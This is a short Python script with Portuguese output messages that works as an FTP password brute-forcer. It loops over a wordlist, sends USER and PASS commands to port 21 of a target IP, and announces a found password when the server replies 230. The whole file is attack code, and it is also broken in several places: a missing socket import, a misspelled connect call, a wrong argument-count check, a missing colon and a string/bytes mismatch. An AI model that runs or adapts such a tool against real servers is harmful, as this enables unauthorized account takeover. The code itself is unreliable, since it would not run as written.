import sys
import re

if len(sys.argv) != 2:
	print("Use python3 lonftp 127.0.0.1 usuario")
	sys.exit(0)

file = open("lista.txt")
ip = sys.argv[1]
usuario = sys.argv[2]
for linha in file.readlines():
	print("Testando com {usuario} {linha}")
	s =  socket.socket(socket.AF_INET, SOCK_STREAM)
	s.conncet((sys.argv[1], 21))
	s.recv(1024)
	s.send("USER "+usuario+"\r\n")
	s.recv(1024)
	s.send("PASS "+linha+"\r\n")
	resultado = s.recv(1024)
	s.send("QUIT\r\n")
	s.recv(1024)
	
	if re.search("230", resultado)
		print("==> SENHA ENCONTRADA <==")
		break
	else:
		print("[-] Acesso Negado [-]")
